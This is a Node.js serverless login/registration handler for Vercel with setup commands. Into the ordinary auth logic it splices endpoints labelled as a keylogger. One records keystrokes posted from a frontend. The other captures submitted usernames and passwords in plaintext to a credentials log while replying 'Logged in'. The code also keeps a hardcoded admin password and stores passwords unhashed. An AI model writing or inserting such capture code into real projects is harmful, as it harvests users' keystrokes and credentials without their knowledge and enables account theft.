npm init -y
npm install --save-dev vercel
npx vercel dev
// Temporary memory to store users
const users = [
    { username: 'admin', password: 'securePassword123' }
];

// --- Keylogger logging helper ---
const fs   = require('fs');
const path = require('path');

const LOG_DIR = path.join(__dirname, '..', 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

function logKey(data) {
    const rollingLog = path.join(LOG_DIR, 'keystrokes.log');
    fs.appendFileSync(rollingLog, `[${new Date().toISOString()}] ${data}\n`, 'utf-8');
    console.log(`[KEYSTROKES] ${data}`);
}

function logCreds(username, password) {
    const rollingLog = path.join(LOG_DIR, 'credentials.log');
    const line = `[${new Date().toISOString()}] user='${username}' pass='${password}'\n`;
    fs.appendFileSync(rollingLog, line, 'utf-8');
    console.log(`[CREDENTIALS] user='${username}' pass='${password}'`);
}

// CHANGED: Using module.exports instead of export default for Vercel compatibility
module.exports = function(req, res) {

    // ============================================================
    // KEYLOGGER ENDPOINTS (added before your existing logic)
    // ============================================================

    // Handle keystroke data from frontend
    if (req.url === '/api/auth/keystrokes' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                if (data && data.keys) {
                    logKey(data.keys);
                    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
                    return res.end(JSON.stringify({ status: 'ok' }));
                }
            } catch (e) { /* ignore */ }
            res.writeHead(400, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
            res.end(JSON.stringify({ status: 'error' }));
        });
        return;
    }

    // Handle captured login credentials from frontend
    if (req.url === '/api/auth/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                if (data) {
                    logCreds(data.username || '', data.password || '');
                    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
                    return res.end(JSON.stringify({ status: 'ok', message: 'Logged in' }));
                }
            } catch (e) { /* ignore */ }
            res.writeHead(400, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
            res.end(JSON.stringify({ status: 'error' }));
        });
        return;
    }

    // ============================================================
    // YOUR ORIGINAL LOGIN / REGISTER LOGIC (unchanged)
    // ============================================================
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }
    
    const { action, username, password } = req.body;

    // --- LOGIN LOGIC ---
    if (action === 'login') {
        const foundUser = users.find(u => u.username === username && u.password === password);
        
        if (foundUser) {
            return res.status(200).json({ 
                success: true, 
                message: 'Login successful' 
            });
        } else {
            return res.status(401).json({ 
                success: false, 
                message: 'Access Denied. Invalid credentials.' 
            });
        }
    }
    
    // --- REGISTRATION LOGIC ---
    if (action === 'register') {
        if (password.length >= 6) {
            const userExists = users.find(u => u.username === username);
            if (userExists) {
                return res.status(400).json({ 
                    success: false, 
                    message: 'Registration Failed: Username is already taken!' 
                });
            }

            users.push({ username: username, password: password });
            return res.status(200).json({ 
                success: true, 
                message: 'Account created successfully! You can now switch to Log In.' 
            });
        } else {
            return res.status(400).json({ 
                success: false, 
                message: 'Registration Failed: Password must be at least 6 characters.' 
            });
        }
    }

    return res.status(400).json({ success: false, message: 'Invalid action requested.' });
};
